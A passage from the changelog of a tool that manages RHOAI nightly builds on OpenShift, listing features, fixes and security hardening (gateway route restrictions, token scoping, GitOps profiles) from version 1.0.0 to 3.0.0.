  contents** a link button, next to the main action (for example **Update
  to latest**). They were inline links, which sat higher than the button.

### Fixed

- **Self-managed OpenShift: the nodes' pull secret.** Only hosted control
  planes (ROSA HCP) pass `kube-system/additional-pull-secret` to the nodes;
  a self-managed cluster's nodes pull with `openshift-config/pull-secret`.
  The Pull secret item said Ready there, and Update then failed with
  "Replacement catalog validation failed ... ErrImagePull ... (Setup step
  1)". The app now reads the control plane topology (Infrastructure
  `cluster`). On a self-managed cluster, or one whose topology it cannot
  read, once the token is saved the item says **Nodes not checked** and
  shows the `oc` command a cluster-admin runs to add only the
  `quay.io/rhoai` entry to `openshift-config/pull-secret` (the token is
  typed at a silent prompt, never written to disk; the app gets no access
  to that Secret), and **Check that the nodes can pull**, which runs
  Update's own catalog check with a temporary CatalogSource and removes it.
  The catalog pull error of Update, Install a different build and the
  check names the pull secret the nodes use; Diagnostics' Pull secret check
  warns with the command; the setup instructions show the `oc`
  ImageDigestMirrorSet on self-managed clusters; the Update dialog's node
  check runs the real pull check there. The gitops profile's pull error no
  longer points to a setup it does not have. New RBAC: `get` on
  Infrastructure `cluster` (SECURITY.md).
- `install.sh uninstall` and `make undeploy` read the namespaces of the
  Roles and RoleBindings from the template they install, instead of a fixed
  list that missed `openshift-ingress-operator` (template revision 5): its
  Role and RoleBinding were left behind. If the template cannot be
  rendered, nothing is deleted.
- **MaaS: a published model routes through the MaaS gateway only.**
  Earlier builds of 3.0.0 kept it on the inference gateway too, and every
  call to its direct address then failed with 500: maas-controller's
  rate-limit policy applies to the model's route on every gateway, and the
  inference gateway's callers have no MaaS subscription. Publish now
  records the model's gateway refs and sets `maas-default-gateway` alone,
  then waits for KServe to move the model's route ("Partly published" with
  the reason when it does not); Unpublish writes the recorded refs back and
  refuses, before changing anything, when someone added a gateway to the
  model meanwhile. While published, the model is used through MaaS (API
  key) and the dashboard's playground; its direct address answers 404,
  which the publish dialog says before you confirm, and the Models tab
  shows the MaaS commands instead of the direct curl. A publication by an
  earlier build shows as "Partly published": Unpublish, then Publish
  again; a gateway someone added to a published model shows as "Partly
  published" too, with the remedy Unpublish gives when it refuses (set the
  model's gateways without the MaaS gateway, then Unpublish). Each chat model of the catalog has its own recorded refs (by
  project and model) and its own route. New RBAC: `get` on the chat
  models' HTTPRoutes `smollm2-135m-instruct-kserve-route`,
  `qwen25-05b-instruct-kserve-route` and `qwen3-1-7b-kserve-route`
  (SECURITY.md).

- In **Install a different build**, each choice's description touched the
  next choice: the choices were not inside a form, and PatternFly sets
  the space between stacked choices only on forms. The choices, the build
  fields and the **Install...** button are now one form.

- Links to the RHOAI dashboard (the app launcher's **RHOAI dashboard**,
  Dashboard Dev's **Open the dashboard**, a pipeline server's **Open
  pipelines**) went to the retired `rhods-dashboard-redhat-ods-applications`
  host, which on current releases only shows "OpenShift AI has a new
  address", or, in the launcher, to a host guessed from the console's.
  They now use the address the Dashboard component CR reports
  (`status.url`, for example `https://rh-ai.<apps domain>`, the same as
  the OpenShift ConsoleLink), at whichever API version is served. Releases
  without it fall back to the `rhods-dashboard` Route (Dashboard Dev and
  pipeline links); the launcher, which the gitops profile shows too and
  whose RBAC has no Route read, then shows no dashboard item rather than a
  guess. No RBAC change.
- Re-running a setup (Repair) on objects an earlier version created could
  never remove a field or list item the tool stopped setting: the create
  (a POST) left an `Update` entry of the tool in `managedFields` that kept
  owning it. Repairing a SeaweedFS from 2.3.x failed with 422 "ports[2].name:
  Duplicate value: admin". Before updating its own object, setup now moves
  the tool's field ownership to server-side apply (the `csaupgrade`
  semantics `kubectl apply --server-side` uses; other managers' entries are
  untouched).
- A setup the API server rejects part-way no longer leaves the cluster
  half-changed: the S3 storage and pipeline server setups send every create
  and update as a server-side dry run first and make none unless all pass.
  While the admin UI moves to its new port, the NetworkPolicy allows the old
  and the new port until SeaweedFS is ready and `minio-service` follows, so
  the admin UI is never blocked while the old pod still serves it.

### Security

- **MaaS on an older or older-style platform.** Publish refuses on
  Connectivity Link 1.4.0 (it silently bypasses gateway authentication,
  per the MaaS docs) and, while other MaaSSubscriptions exist, below 1.5;
  this tool's subscription (every signed-in user) takes a priority below
  every other subscription, so a key minted without naming one never goes
  to it; gateway policies on `maas-default-gateway` that maas-controller
  does not manage (a tier-based MaaS left them) hold publishing back, and
  the gateway's authentication is judged by maas-controller's own
  AuthPolicy, not the first one found; a `maas-default-gateway` someone
  else made that admits every namespace is not published through (the
  tab shows the patch). Refusals name the part that blocks. The
  infrastructure namespace deadlock is gone (RHOAI creates it only once
  MaaS is on; setup now creates it, as the docs' script does), and the
  CloudNativePG check no longer misses an operator that is not installed.
- **Your own token never goes to a model or a pipeline server** (final
  review). Those run in projects whose editors control what answers at
  their addresses. The Models tab shows commands only for this tool's model
  with its own token Secret (no `oc whoami -t` fallback, none for a model
  this tool did not set up; **Set up again to create its token** for one
  without). The sample pipeline commands and the KFP snippet make
  ServiceAccount `pipeline-api` with a Role for that pipeline server's API
  only and a 15-minute token. SECURITY.md has a new section, "Which token
  is used where", which also explains why a MaaS API key is still minted
  with your token through the MaaS gateway (RHOAI's design).
- Publish refuses a model whose spec was changed since this tool set it
  up (image, model URI, preset, command, environment; an editor could do
  that before a cluster-admin publishes it);
  MaaS setup and publish refuse a `models-as-a-service` or infrastructure
  namespace a user made with a project request (MaaS adopts it); the MLflow
  and dashboard addresses in copied commands are single-quoted and must be
  plain https addresses. SECURITY.md corrects what a leaked ServiceAccount
  token can do with Secrets (mint any ServiceAccount's token), why the
  model token Role passes the escalation check, and the `list gateways`
  check, and documents the SeaweedFS admin Route's unauthenticated
  `/metrics`.
- **Inference gateway: only the projects on its list.** The gateway this
  tool creates accepted routes from every namespace (`from: All`, the RHOAI
  chart's default until August 2026), so a route in any project with a
  model's exact path took over that model's calls and its callers' tokens
  (confirmed live). Both listeners now list the projects they allow by
  name, as RHOAI documents the gateway (`allowedRoutes` `from: Selector`,
  `kubernetes.io/metadata.name In [...]`): the gateway's own namespace and
  each project a model is set up in, added before the model is created. A
  model deployed elsewhere (in the dashboard, say) in a project not on the
  list never becomes ready; the Models tab and the Overview name it, with
  **Allow <project>**. A gateway an earlier build made gets the list at its
  next change, with the projects of this tool's own models on it; other
  projects with models there are named with **Allow <project>** (anyone
  who can edit an allowed project can attach routes to the gateway, so a
  dummy LLMInferenceService no longer gets its project listed). Someone
  else's
  gateway is not changed: the tab says which projects it allows and gives
  RHOAI's step for a cluster admin.
- The MLflow samples and the playground no longer follow HTTP redirects
  with the app's token: a 3xx answer is reported as an error that says
  where it pointed.
- MaaS tab, Authorino TLS commands: the certificate Secret's name read from
  Authorino's CR must be a valid Kubernetes name, or no commands are shown
  and the tab says why; every substitution is shell-quoted.
- **S3 storage migration: the tool's own namespace only, and new keys.**
  Namespace `minio` counts as an earlier version's storage only when the
  namespace shows the tool made it (its label, or the earliest versions'
  POST without a project requester), so `oc new-project minio` with planted
  objects is ignored and shown as not this tool's. Migrate storage gives the
  new storage new keys and gives them to the pipeline servers it moves; the
  old keys are used only by the copy Job, through a Secret the Job owns
  (`seaweedfs-migrate-source`, one new RBAC rule).
- Copy-paste commands: addresses from the cluster (a model's address, a
  pipeline server's API, the MaaS address) are single-quoted, and the server
  shows only plain https addresses, saying why when it hides one.

## [2.3.3] - 2026-11-16

### Fixed

- Local development (`dev.sh`): the webpack dev server gzipped the proxied
  API responses, which buffered the streamed progress of an operation until
  it ended, so the page showed "Update: starting" for the whole update.
  Compression is now off for the dev server; the deployed app has no such
  proxy and was not affected.

- OpenShift 5 clusters: the oauth-proxy image is now pulled from the
  `openshift5` registry namespace instead of `openshift4`, matching the
  cluster's major version. On OpenShift 5 the `openshift4` path has no
  matching tag, so the proxy pod stayed in `ImagePullBackOff` and the app
  never started. Detection still honours an explicit `OAUTH_PROXY_IMAGE`,
  and 4.x clusters are unchanged.

### Security

- Go 1.27.4 (CI, the image build and the GitHub workflows): fixes the
  net/http advisory GO-2026-6859 that govulncheck reports with 1.27.3.

## [2.3.2] - 2026-11-06

2.3.1 was tagged with the same fix but never published: a clock-dependent
test failed its pipelines. Its GitLab tag remains; there is no 2.3.1 image
or installer.

### Fixed

- A Build Explorer test expected "Committed 3w ago" of a fixed date and
  started failing a month later; it now accepts any age.

- The 3.7 builds were missing from the Status page, the Build Explorer and
  the update check: the tag scan read at most 30 pages of the registry's
  tag list from each of a few fixed start points, and 3,600 per-commit tags
  (`rhoai-3.6-<sha>`, `rhoai-3.6-ea.N-<sha>`) had come to lie between
  `rhoai-3.5` and `rhoai-3.7-ea.1`, with no start point between them. The
  list is in a locale order that ignores punctuation, so no cursor can skip
  a version's block reliably either. The release tags are now found by
  asking the registry whether each name exists (`HEAD manifests/<tag>`):
  the minors of each major in batches (a minor counts when its GA tag or
  its first EA exists), then each minor's EAs and patches, stopping after a
  run of misses. A few hundred small requests per scan, cached for five
  minutes as before, and a version is never skipped however many commit
  tags surround it. A probe that found a tag also caches its digest.

## [2.3.0] - 2026-10-30

### Added

- Dashboard Dev shows the commit of every PR or main build and its distance
  from upstream `main`: `GET /api/dashboard/builds` reads each running
  image's labels (anonymously; `quay.io/opendatahub` is public) for its
  commit, build date and repository, asks GitHub how the commit relates to
  the branch it tracks (`opendatahub-io/odh-dashboard` `main` for a main
  build, the PR's head commit for a PR build) and resolves the tag the build
  was deployed from. The containers card shows the short commit as a link,
  "built"/"committed" times, and a chip: *Up to date with main*, *N commits
  behind main* with a Compare link, *Not on main*, *Latest commit of PR #N*,
  *PR #N has M newer commits*, *PR #N merged*, or *Distance from main
  unknown* with the reason. When the tag has moved on, the card lists the
  newer build and a notice above it says to deploy again; the existing
  Deploy actions pick it up. The route is separate from the polled state
  because registry and GitHub reads take seconds; GitHub answers are cached
  (compare of two SHAs for good, `main`'s head for 5 minutes, a tag's digest
  for a minute) and a rate limit leaves the distance unknown with the retry
  time instead of failing. Anonymous GitHub allows 60 requests per hour per
  egress IP; `GITHUB_TOKEN` on the Deployment raises it to 5000. Off in the
  gitops profile like the rest of Dashboard Dev.
- The Build Explorer search takes the URL of a GitHub PR (or `owner/name#N`)
  of any RHOAI component repository, not only `#N` of
  opendatahub-io/odh-dashboard: `GET /api/build-explorer/contains` takes a
  `repo` of `opendatahub-io`, `red-hat-data-services`, `kubeflow`, `kserve`,
  `trustyai-explainability`, `llm-d`, `feast-dev` or `ray-project` (the
  upstreams the RHOAI forks come from; anything else is a 400, since the
  server asks GitHub with its own token) and finds the build's component
  image by its `git.url` label, the `red-hat-data-services` fork of that name
  (or the repository itself), instead of a fixed image name. A fork that
  cherry-picks or rebases upstream changes has different commit SHAs, so a
  PR it took that way shows as *Does not contain* (forks of one GitHub
  network resolve each other's SHAs, so the compare answers); *Unknown
  (commit not on GitHub)* only appears for a SHA GitHub does not know at all.
- A commit SHA, or the URL of a GitHub commit, is searched by containment,
  like a PR: the same route takes `commit=` (7 to 40 hex), resolves it on the
  repository and then on the fork (upstream odh-dashboard SHAs exist in the
  fork, which merges `upstream/main`) and compares each build's component
  commit with it. Only when GitHub knows the commit nowhere does the page
  fall back to the old scan for a component image built from exactly that
  commit, and says so. The response describes a commit with `commit`,
  `commitDate`, `commitTitle` and `commitURL`.
- The search results start with one sentence: *PR #5123 is in the installed
  build and rhoai-3.6.*, *No build contains PR #5123 yet: it was merged 2h
  ago, after the newest build (9h ago).*, *No checked build contains PR
  #5123.* or, when no build could be checked, *Could not tell whether any
  build contains PR #5123.*, with a subtle line for the rest (*Not in
  rhoai-3.5 and rhoai-3.4. 4 older builds were built before the merge. 3
  builds could not be checked (GitHub rate limit).*). A commit's title is on
  the header line (*Commit 6c8ac6e: Show the model deployment status.
  Committed 1d ago in opendatahub-io/odh-dashboard.*).
- `/builds?q=<text>` runs that search once the builds are listed, again when
  the URL changes while the page is open, and submitting a search writes it
  to the URL, so a search can be shared. The Status page's `?image=` link
  keeps working.
- Dashboard Dev's containers card links each PR or main build's commit to
  the Build Explorer search for it (*Find in nightlies*), as the commit's
  GitHub URL, so the search knows the repository.

- When no nightly contains a PR or commit, the Build Explorer explains why
  in plain words under *Why no nightly has it yet*: for odh-dashboard, the
  road a change travels (`main` → the `stable` branch, updated in batches →
  Red Hat's copy, red-hat-data-services/odh-dashboard → the release branch →
  the nightly) and whether `stable` has the change yet, with its last update
  time (one branch read and one compare, cached); for other components, that
  nightlies come from Red Hat's copy of the repository, which takes upstream
  changes on its own schedule. The "how contains is decided" popover and the
  README say the same without assuming the reader knows the repositories.

### Changed

- A nightly pushed more than an hour before the PR was merged (or before the
  searched commit) cannot contain it, so the search answers it from the
  build's date label alone: *Does not contain, built before the merge*, with
  no catalog or GitHub read. The hour allows for clock differences between a
  committer's machine and the registry. The page does the same for the
  builds whose date it already has, without a request. A PR search over 25
  builds now reads only the builds newer than the merge.
- The image label cache holds 10000 entries instead of 2000 (25 builds x
  165 images), so a search over every build stays warm.
- Wording: the commit search's finished line no longer says that later builds
  also contain the commit; a build whose component image has no commit label
  names that image; the help popover and the placeholder (*Image, commit SHA,
  PR # or PR URL*) list what can be searched. The results table's third
  column is *Commit in build* (the component is named in the header popover),
  the search field is wide enough for its placeholder on desktop, and the
  installed build is "the installed build" in sentences.

- Deploy latest main writes the build under its commit tag,
  `quay.io/opendatahub/<repo>:<commit tag>@sha256:...`, so the page and
  `oc get deploy` name the commit instead of a tag that moves dozens of
  times a day. Both pipelines publish such a tag next to the floating one:
  Konflux tags every push build with the full 40-hex commit (next to
  `odh-stable`, the RHOAI build) and OpenShift CI's postsubmit mirrors `main`
  to `main-<first 7 hex of the commit>` (the ODH build); the same scheme holds
  for every module repository. Deploy reads the resolved digest's commit
  label and checks that the commit tag exists for the same digest; without a
  commit label, without the tag, or when it has moved, the floating tag is
  kept as before. The session still records the floating tag, so the page
  keeps saying "Latest main". PR builds keep their `odh-pr-<N>`/`pr-<N>` tag.
- The image label reader falls back from `git.url` to `vcs-url` and
  `io.openshift.build.source-location` (the OpenShift CI images have no
  `git.url`); `org.opencontainers.image.revision` is never read, since on
  those images it is not the source commit.

### Fixed

- The Components page showed a dash instead of a commit for the MLflow
  server: its Deployment names `quay.io/opendatahub/mlflow:odh-stable`, a
  floating tag of an ODH repository, and labels were read only for `rhoai/`
  images pinned by digest. Labels are now read for ODH images too, from the
  digest a running pod reports when the Deployment names a tag. An image
  whose registry read failed or timed out was never asked about again until
  Refresh or a reload; the page now asks again, in the background, five
  minutes later. The dash of an image that is not an RHOAI or ODH build (the
  dashboard redirect's UBI nginx) says so in its tooltip instead of "Not
  recorded in the image labels".
- An ODH (OpenShift CI) build showed the wrong build date and version:
  "built 20h ago · committed 4h ago" on Dashboard Dev, and `9.8` as a
  version on Components, because those images carry the UBI base image's
  `build-date` and `version` labels. For an image with an
  `io.openshift.build.commit.id` label the build date is now the image
  config's `created` time and no version is shown.
- A Dashboard Dev PR build (RHOAI flavour) showed *Distance from PR
  unknown: opendatahub-io/odh-dashboard has no pull request*, because the
  image's `git.url` label names the branch's repository, the contributor's
  fork, and the PR was looked up there. PR builds are now compared in
  upstream `opendatahub-io/odh-dashboard`, where the PR and its commits
  live. An ODH (OpenShift CI) PR build has no commit label at all (the
  `vcs-ref` is empty on PR builds, not on main builds); the card says so
  instead of "The image has no commit label."
- The Components row of a Deployment with several containers described the
  first one: `rhods-dashboard` showed the kube-rbac-proxy sidecar's image
  and commit. The row now describes the container named like the
  Deployment, else the first container that is not a known sidecar.
- The Status page could show an old "latest nightly" on the first load after
  hours without a poll (a closed tab, an expired session) until the next poll
  or a click on Refresh: the latest-build comparison was served from the cache
  whatever its age while a refresh ran in the background. A comparison older
  than five minutes is now looked up before answering, with the same timeout
  and error handling as a first poll; entries between one and five minutes
  old are still served while they refresh.
- docs/GITOPS.md said Renovate's `helm-values` manager does not read the
  chart's image values and sketched a regex manager for them, which would
  track each image twice: the manager reads any string under a key ending in
  `image` (`parameters.IMAGE`, `parameters.OAUTH_PROXY_IMAGE`,
  `gitops.cliImage`). Section 3 now shows ai-grid-tenant's setup: the
  `helm-values` manager for the images (with a pattern for
  `values-<cluster>.yaml`), a regex manager only for the chart's
  `targetRevision` by GitHub releases, one group for the chart and its
  image, and digest-only updates for the oauth-proxy and CLI images.

## [2.2.0] - 2026-10-27

### Added

- A Helm chart, `deploy/chart`, so Argo CD can deploy the updater from a
  GitOps repository at a release tag ([docs/GITOPS.md](docs/GITOPS.md)). It
  renders `deploy/template.yaml` itself (a copy in the chart, checked by
  `make check-chart`, CI and the release guard), so the template stays the
  only definition of the app's objects. Hooks replace `install.sh`'s
  imperative steps: a Sync hook Job creates the cookie Secret once and never
  replaces it, a PostSync hook Job adds the ConsoleLink. Every image is
  pinned by digest in Git (the updater, oauth-proxy and the hook image); an
  image without a digest, an unknown or misspelled value, or an image tag
  that names another release than the chart's fails the render. That last
  check compares the tag only: docs/GITOPS.md says how to check the digest's
  commit.
- Template parameter `INSTALL_METHOD` (empty by default; the chart sets
  `gitops`), passed to the app: on a GitOps install the "vX.Y.Z is
  available" and "deployment is out of date" notices and the help dialog say
  to change the chart's `targetRevision` and image in Git instead of running
  `install.sh`. `GET /api/version` reports it as `installMethod`. Older
  templates lack it and keep the `install.sh` wording, so
  `TEMPLATE_REVISION` stays 4.
- `make chart`, `make check-chart` and `make test-chart`
  (`scripts/test-chart.sh`), and a `chart` job in GitLab CI and GitHub
  Actions with Helm v3.22.1, checked by SHA-256.
- The release guard also checks that `deploy/chart/Chart.yaml` names the
  release (`version` X.Y.Z, `appVersion` vX.Y.Z), and the release notes name
  the chart.
- Profiles ([docs/GITOPS.md, section 11](docs/GITOPS.md#11-profiles)):
  setting `PROFILE` (Template parameter, empty = `full`) picks what the
  updater may do; any other value than `full` or `gitops` stops it at
  startup, and `GET /api/version` reports it as `profile`. `full` is every
  feature, unchanged. `gitops`, for clusters where Argo CD manages RHOAI,
  allows only Update (its Argo CD path: install the build the Git-managed
  catalog serves; refused unless Argo CD manages CatalogSource
  `rhoai-catalog-dev`), its dry run, and the Status, Components and
  Diagnostics reads, which then need cluster-admin like every change. Every
  other route answers 403 `profile_gitops` before any API call; the UI hides
  those pages and actions and says why. In that profile Update never creates
  the operator namespace or OperatorGroup and never ends a Dashboard Dev
  session; it refuses instead.
- The chart's `profile` value, `gitops` by default: it renders the
  Template's objects without its RBAC plus `deploy/rbac-gitops.yaml`, the
  RBAC the gitops profile reaches and nothing more (cluster-wide reads only;
  no Secret, Deployment, namespace, webhook, CatalogSource or OperatorGroup
  writes), and a ValidatingAdmissionPolicy that lets the updater's
  ServiceAccount write only Subscription `rhods-operator` from
  `rhoai-catalog-dev` with at most the environment variables of
  `gitops.subscriptionEnvAllowlist` (default `DISABLE_DSC_CONFIG`) in
  `spec.config`, approve or delete only rhods-operator InstallPlans, delete
  only rhods-operator CSVs, and no CatalogSource or OperatorGroup. In that
  profile Update reads the build from the catalog Git manages instead of a
  temporary verification catalog, checks before deleting anything that the
  policy allows the Subscription it creates and the one it would restore,
  and runs only while the policy and its binding are exactly this
  release's, rendered with the pod's settings (checked at startup, every
  minute, before each Update and before its first deletion; 503
  `admission_policy_missing` otherwise). The gitops profile needs OpenShift
  4.17 or later. `profile: full` renders as before. Tests derive the RBAC
  from a call graph of the gitops routes, prove no catalog write is
  reachable, and evaluate the policy's CEL with cel-go (a new test-only
  dependency, `github.com/google/cel-go`) on shared cases next to the Go
  rule. `TEMPLATE_REVISION` stays 4: the full profile's template RBAC is
  unchanged, the new Template parameter `SUBSCRIPTION_ENV_ALLOWLIST` and
  variable `GITOPS_ADMISSION_POLICY` are read only in the gitops profile,
  and an install without `PROFILE` runs the full profile.
- A nightly catalog that an ACM policy enforces counts as managed, as one
  Argo CD tracks does: `config-policy-controller` owns its `f:spec` in
  `managedFields` (read from the same GET; no new RBAC). Both profiles leave
  it as the policy sets it and install the build it serves; the gitops
  profile runs on it; messages and the Status page name the policy.
  `GET /api/status` reports `catalogSource.managedByACM`.

### Changed

- The chart deploys only on clusters that run RHOAI: with `profile: gitops`
  its RBAC has a Role in RHOAI's operator namespace, so a sync fails where
  that namespace does not exist. docs/GITOPS.md (sections 5 and 9) and the
  chart's values say so, and how an ApplicationSet selects only such
  clusters.
- The gitops profile never contacts Quay, another registry or GitHub, and
  reads no Secret: every page's build information comes from the cluster
  ([docs/GITOPS.md](docs/GITOPS.md#no-registry-access)). The dry run's
  version check uses the head the catalog serves (PackageManifest); the
  Status page's *Latest* row says a newer nightly arrives as a change in
  Git (no Quay lookup, no 401); Components shows the operator build from
  the installed CSV and no image labels, and takes DSC defaults from the
  CSV's `alm-examples` only; Diagnostics has no pull-secret check; the
  updater's own release check is off (`pinnedInGit`; the chart pins it in
  Git). Update and its dry run no longer read
  `kube-system/additional-pull-secret`: they say the cluster's own pull
  secrets are used, and the Status page shows the secret as *Not used*.
  `deploy/rbac-gitops.yaml` renders its Role in `kube-system` with no rules,
  under the name `install.sh` used, so moving an install to Argo CD removes
  `install.sh`'s Secret grant; Diagnostics reports (with
  SelfSubjectAccessReviews) when the ServiceAccount can still read Secrets. A test on the
  profile's reference graph fails when anything it reaches sends a request
  to another host than the API server. The full profile is unchanged.

### Fixed

- Recovery after a failed Update, Reinstall or Re-deploy deleted whatever
  operator Subscription it found. It now deletes only the one the operation
  applied (its UID, from the apply's answer), and leaves a replacement, and
  the CSVs installed for it, alone and reports it.
- Update's managed path (Argo CD or an ACM policy sets the catalog, both
  profiles) read the head to check from the catalog's PackageManifest,
  which can still describe the previous catalog right after Git changes the
  image. After a rollback in Git, the downgrade check could pass and OLM
  install the older build. The recreated Subscription now pins
  `startingCSV` to the checked head, and the restore pins the removed CSV,
  so OLM installs exactly those or nothing (`resolution_failed`).
- Update under Argo CD: when someone replaced the operator Subscription
  just before Update deleted it, Update left the replacement alone, but its
  automatic restore then deleted the replacement and re-applied the old
  Subscription. The restore now leaves it alone too and reports it.

## [2.1.0] - 2026-10-14

### Added

- Clusters where Argo CD (OpenShift GitOps) manages RHOAI. The tool notices
  Argo CD's tracking annotation on the nightly CatalogSource, the operator
  Subscription and the DataScienceCluster, and works with Git as the source
  of truth (RUNBOOK §13; no change to the Argo CD Application is needed):
  - Git picks the build: the catalog image stays as Git sets it. The Status
    page shows the build Git set, whether the operator runs it (**Install
    pending** when Git moved to a build of the same version, which OLM does
    not install by itself), and a newer nightly in Quay as the image to put
    in Git.
  - Update becomes *Install the build the catalog serves*: it keeps the
    channel Git sets, deletes the old CSV, and deletes the Subscription only
    right before recreating it with Argo CD's tracking and labels, so Argo
    CD does not recreate it from Git in between (a self-heal sync that
    follows finds it unchanged). Any other image is refused before anything
    changes.
  - Re-deploy, Reinstall and *Create the DataScienceCluster* are off while
    Argo CD manages the operator, and DSC repairs and Diagnostics' *disable
    component* while it manages the DSC: Argo CD would undo them.
    Diagnostics' prerequisite-operator guidance says to add the operator in
    Git instead.
  - Update checks, after OLM reports success, that the installed CSV is the
    build it verified (`containerImage` and `createdAt` annotations), and
    reports `install_mismatch` otherwise instead of success.
- `GET /api/status` reports `subscription.managedBy`,
  `catalogSource.managedBy`, `dscManagedBy` and, under Argo CD,
  `catalogServes` (the catalog's head CSV, its build, and whether it is
  installed).

### Security

- Go 1.27.2 (CI, the image build and the GitHub workflows): fixes the
  net/http, HTTP/2, crypto/tls and net/textproto advisories GO-2026-6603,
  6605, 6607 to 6613 and 6617 that govulncheck reports with 1.27.1.

## [2.0.1] - 2026-10-07

### Upgrade notes

- Upgrading from v2.0.0 or any earlier build: download and run the
  `install.sh` of v2.0.1 (commands at the end of these notes; pass the
  options your install was made with, such as `--namespace`, `--app-name`
  and `--image-repo`). From a clone: `git checkout v2.0.1 && make upgrade`.
- Reload open app pages after upgrading: a DSC repair from a page loaded
  before v2.0.1 is refused with a "refresh and review" message.
- Same template as v2.0.0 (revision 4): no RBAC change, no full redeploy.

### Fixed

- RHOAI 3.6 nightlies serve DataScienceCluster v3: the Components page no
  longer fails with "GitHub returned HTTP 404" for
  `datasciencecluster_v1_datasciencecluster.yaml`. The DataScienceCluster,
  DSCInitialization, Platform and Dashboard CR API versions come from API
  discovery (preferred first, then newest first) instead of a fixed v2/v1
  list; DSC defaults accept an alm-examples example of any version, and the
  GitHub fallback tries the sample of each served version.
- A DSC is only compared with (and reset to, or created from) defaults of
  the version it is read at. When the operator's conversion webhook cannot
  convert it to the preferred version, it is read at the next version that
  works, the Components page says so, and a missing defaults version is
  explained instead of showing a sample URL.
- The Components page's "Edit in console" link uses the DSC's version
  instead of v2.
- DataScienceCluster v3 nests parts under a component (`dashboard.standard`,
  `kserve.nim`, `data.featureStore`). "Reset to version defaults" now lists
  each part it would switch to Removed, including the enabled parts of a
  component switched off, and both repairs refuse while the part's module
  could hang in deletion, as for whole components.
- A DSC repair runs only at the API version its preview was computed at; if
  the DSC is read at another version by then (for example after an operator
  update fixed the conversion), it asks to refresh and changes nothing.
  The reset dialog enables Confirm only when its defaults preview matches
  the version and operator the page compared with (otherwise it says the
  DataScienceCluster changed and offers Refresh), and a reset runs only if
  it would switch to Removed exactly the components the dialog listed.
- A part the installed CRD does not define (for example an old
  `dashboard.legacyPart`) is pruned by "Remove invalid fields" without the
  deletion checks of the component's module.

### Added

- Diagnostics "API versions": reports a RHOAI CRD version that the
  operator's conversion webhook cannot convert to (one problem per kind,
  with the API server's message, the versions that work, and read-only
  commands), as when a nightly's operator image is older than the CRDs of
  its bundle. Each served version is checked on its first object; with no
  object it could read, the check warns instead of passing. See
  [RUNBOOK §11.8](RUNBOOK.md#118-the-operator-cannot-convert-a-crd-version).
- The "vX.Y.Z is available" notice shows that release's installer as a
  command to copy (only for a plain https download URL, quoted), with the
  git route as the alternative. For this project
  it downloads from the public GitHub mirror, because the GitLab project's
  release assets need a sign-in; the GitLab release notes do the same. See [docs/UPGRADING.md](docs/UPGRADING.md#patch-and-minor-releases).

## [2.0.0] - 2026-10-06

### Upgrade notes

- **Requires a full redeploy** (template revision 4; v1.0.0 has revision 2).
  Use the `install.sh` of v2.0.0, or `git checkout v2.0.0 && make upgrade`.
  Deployments that still pull `:latest` stay on v1.x: `:latest` no longer
  moves to a new major version by itself. See [docs/UPGRADING.md](docs/UPGRADING.md).
- **RBAC changes:** the ClusterRole adds `get` on `operator.openshift.io`
  objects named `cluster` (prerequisite operands), `list` on cert-manager
  `Certificates`, and the SeaweedFS objects (`seaweedfs` Deployment and
  Service, `seaweedfs-pvc`, `seaweedfs-ingress`); it keeps `delete` on the
  MinIO objects only to remove them.
- **S3 test storage moves from MinIO to SeaweedFS** on the next storage setup
  or repair. SeaweedFS starts empty; the old `minio-pvc` is kept until
  teardown. Rollback steps: [RUNBOOK §10.1](RUNBOOK.md#101-migrate-storage-from-an-earlier-version).
- New template parameters `IMAGE_REPOSITORY` and `RELEASES_URL` (the update
  check); `install.sh` and `make` pass the repository they install from.

### Added

- Versioned releases: `vX.Y.Z` tags build an immutable `:vX.Y.Z` image, move
  `:vMAJOR`, and move `:latest` only within its major version (a manual CI job
  promotes it across majors). Pushes to `main` publish `:main` and the commit
  tag, never `:latest`. GitLab and GitHub Releases carry the notes,
  `install.sh` and `deploy/template.yaml`.
- `install.sh`, attached to every release: installs or upgrades exactly that
  release with only `oc` and `curl`, no clone. `make deploy`, `upgrade`,
  `rollback` and `resolve-image` run the same script.
- `make release VERSION=vX.Y.Z`, with the release guard (CHANGELOG entry, and
  a higher MAJOR whenever the template revision changes).
- The masthead shows the running release; a dismissible notice says when a
  newer release exists, and when it needs a full redeploy.
- Diagnostics explain why the DataScienceCluster is not ready (the DSC
  readiness doctor): classified causes per component, linked to the problems
  that fix them; a missing operand CR of a prerequisite operator; stale
  module roll-ups only across scans; Certificates that cert-manager has not
  issued, including a Ready Certificate whose Secret is gone.
- The Components page shows a not-ready component's classified cause.

### Changed

- The S3 test storage is SeaweedFS instead of MinIO, with recovery from
  interrupted setups; its status comes from the serving configuration, and
  an incomplete storage shows its reason as a warning.
- `TAG` defaults to the release tag HEAD is on; without one, `make deploy` and
  `make upgrade` ask for a release checkout or an explicit `TAG=main` /
  `TAG=<commit>`.
- The restart fix resolves `maxSurge` and `maxUnavailable` like the
  Deployment controller.

### Documentation

- A visual guide: README tour, a step-by-step QUICKSTART, UPGRADING (with the
  pre-v1 deployment variants verified live) and RUNBOOK troubleshooting, with
  annotated crops, light and dark screenshots, GIFs and Mermaid diagrams. All
  images come from a mock backend (`make docs-screenshots`), never a real cluster.

### Fixed

- Small UI text and layout issues found while capturing the docs: a missing
  full stop in the remote-operation banner, a sentence starting in lower case
  in the module back-off problem, a repeated tag in the Build Explorer compare
  header, the S3 storage row squeezing its text on mid-size windows, the S3
  storage title naming SeaweedFS while MinIO still runs, and "Not managed by
  this tool" shown for resources that do not exist.

### Security

- Test credentials are built at run time instead of being committed, so leak
  scanners do not flag them.
- SECURITY.md notes that SeaweedFS logs the S3 access key ID at startup.

## [1.0.0] - 2026-10-06

First release (template revision 2): the image is deployed by digest and
checked against the template of its own commit, the oauth-proxy cookie secret
lives in a Secret, RBAC is least-privilege with namespace-suffixed names,
cluster operations hold a cross-pod lock, and the UI covers Status,
Components, Build Explorer, Dashboard Dev, Test resources and Diagnostics.
